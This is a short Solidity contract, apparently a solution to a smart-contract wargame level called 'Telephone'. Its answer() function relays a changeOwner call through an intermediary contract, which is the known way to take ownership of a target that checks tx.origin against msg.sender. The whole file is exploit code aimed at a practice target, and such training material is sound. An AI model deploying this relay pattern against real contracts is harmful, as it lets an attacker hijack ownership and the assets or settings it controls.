// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

interface Telephone {
    function changeOwner(address) external;
}

/**
 * @title AnswerTelephone
 * @dev Calls the changeOwner function from Telephone contract
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */
contract AnswerTelephone {
    address public owner;
    address telephone_contract;

    modifier onlyOwner {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function setContract(address c) public onlyOwner {
        require(c != telephone_contract);
        telephone_contract = c;
    }

    function answer(address new_owner) public {
        Telephone(telephone_contract).changeOwner(new_owner);
    }
}